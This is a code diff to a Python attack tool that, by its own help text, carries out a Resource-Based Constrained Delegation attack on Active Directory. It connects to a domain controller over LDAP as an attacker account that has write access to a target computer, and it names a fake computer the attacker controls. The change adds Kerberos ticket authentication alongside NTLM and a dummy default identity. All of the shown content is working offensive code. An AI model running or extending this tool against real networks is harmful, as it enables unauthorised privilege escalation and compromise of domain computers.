@@ -21,8 +21,9 @@ parser = argparse.ArgumentParser(add_help=True, description='Resource-Based Cons
 parser.add_argument('-dc-ip', required=True, action='store', metavar='ip address', help='IP address of the Domain Controller')
 parser.add_argument('-t', required=True, action='store', metavar='COMPUTERNAME', help='Target computer hostname where the attacker has write access to properties')
 parser.add_argument('-f', required=True, action='store', metavar='COMPUTERNAME', help='(Fake) computer hostname which the attacker can control')
+parser.add_argument('-k', action='store_true', default=False, help='Use Kerberos authenticaton (ccache ticket is in KRB5CCNAME, identity is not required)')
 parser.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for LDAP auth (instead of password)')
-parser.add_argument('identity', action='store', help='domain\\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)')
+parser.add_argument('identity', action='store', nargs='?', default='dummy\\dummy:dummy', help='domain\\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)')
 
 if len(sys.argv) == 1:
     parser.print_help()
@@ -49,8 +50,12 @@ logging.info('Starting Resource Based Constrained Delegation Attack against {}$'
 logging.info('Initializing LDAP connection to {}'.format(options.dc_ip))
 #tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
 serv = ldap3.Server(options.dc_ip, tls=False, get_info=ldap3.ALL)
-logging.info('Using {} account with password ***'.format(attackeraccount[0]))
-conn = ldap3.Connection(serv, user=attackeraccount[0], password=attackerpassword, authentication=ldap3.NTLM)
+if options.k:
+    logging.info('Using Kerberos authentication')
+    conn = ldap3.Connection(serv, authentication=ldap3.SASL, sasl_mechanism=ldap3.KERBEROS)
+else:
+    logging.info('Using {} account with password ***'.format(attackeraccount[0]))
+    conn = ldap3.Connection(serv, user=attackeraccount[0], password=attackerpassword, authentication=ldap3.NTLM)
 conn.bind()
 logging.info('LDAP bind OK')
 
